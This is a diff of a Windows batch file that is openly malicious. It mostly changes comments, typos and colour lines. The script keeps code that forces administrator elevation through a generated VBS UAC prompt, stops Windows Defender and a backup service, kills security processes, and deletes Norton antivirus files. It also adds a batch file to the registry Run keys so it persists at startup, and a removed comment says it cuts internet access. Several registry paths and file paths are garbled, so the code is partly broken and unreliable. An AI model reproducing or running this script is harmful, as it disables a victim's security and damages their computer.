@@ -1,68 +1,11 @@
-:: give admin
-
 set "params=%*"
 cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )
+:: ^THIS^ Must stay at the top of this File, this gives the file administrative access.
 
 
-COLOR 8A
-COLOR 0B
-COLOR 1C
-COLOR 2D
-COLOR 3E
-COLOR 4F
-COLOR 5F
-COLOR 6D
-COLOR 7E
-COLOR 8A
-COLOR 0B
-COLOR 1C
-COLOR 2D
-COLOR 3E
-COLOR 4F
-COLOR 5F
-COLOR 6D
-COLOR 7E
-COLOR 8A
-COLOR 0B
-COLOR 1C
-COLOR 2D
-COLOR 3E
-COLOR 4F
-COLOR 5F
-COLOR 6D
-COLOR 7E
-COLOR 40
-COLOR 8A
-COLOR 0B
-COLOR 1C
-COLOR 2D
-COLOR 3E
-COLOR 4F
-COLOR 5F
-COLOR 6D
-COLOR 7E
-COLOR 8A
-COLOR 0B
-COLOR 1C
-COLOR 2D
-COLOR 3E
-COLOR 4F
-COLOR 5F
-COLOR 6D
-COLOR 7E
-COLOR 8A
-COLOR 0B
-COLOR 1C
-COLOR 2D
-COLOR 3E
-COLOR 4F
-COLOR 5F
-COLOR 6D
-COLOR 7E
-COLOR 40
 
-:: Disable antivirus, firewall, taskmanager, to make sure your not going to get out of this...
 
+:: Disables antivirus, firewall, taskmanager, to make sure your not going to get out of this...
 net stop "SDRSVC"
 net stop "WinDefend"
 taskkill /f /t /im "MSASCui.exe"
@@ -88,11 +31,8 @@ del /Q /F C:\Program Files\Norton~1\Norton~1\*.*
 del /Q /F C:\Program Files\Norton~1\*.*
 
 
-
+::color red, can be changed.
 COLOR 0F
-
-
-:: REMOVES INTERNET (Will not let you reconect)
 
 echo @echo off>c:windowswimn32.bat
 echo break off>>c:windowswimn32.bat
@@ -101,10 +41,10 @@ echo end>>c:windowswimn32.bat
 reg add hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
 reg add hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
 echo Loading...
-echo Tanks you for your coroperation!
-echo Olease type anything, or press enter ...
+echo THanks you for your coroperation!
+echo Please press enter!
 PAUSE
 @echo off
 cls
 
-COLOR 0F
+::end
